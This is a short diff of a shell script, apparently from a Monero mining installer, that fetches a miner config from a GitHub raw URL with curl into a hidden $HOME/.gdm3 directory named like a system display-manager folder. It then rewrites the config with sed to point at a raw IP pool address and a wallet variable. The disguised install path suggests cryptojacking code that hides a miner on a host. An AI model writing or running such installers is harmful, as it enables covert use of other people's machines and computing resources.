@@ -251,8 +251,10 @@ fi
 
 
 rm -rf $HOME/.gdm3/config.json
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json ; mv config.json $HOME/.gdm3/config.json
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm3/config.json
+#wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output /tmp/ctemp
+mv /tmp/ctemp $HOME/.gdm3/config.json
+
 
 sed -i 's/"url": *"[^"]*",/"url": "194.164.63.118:8080",/' $HOME/.gdm3/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm3/config.json
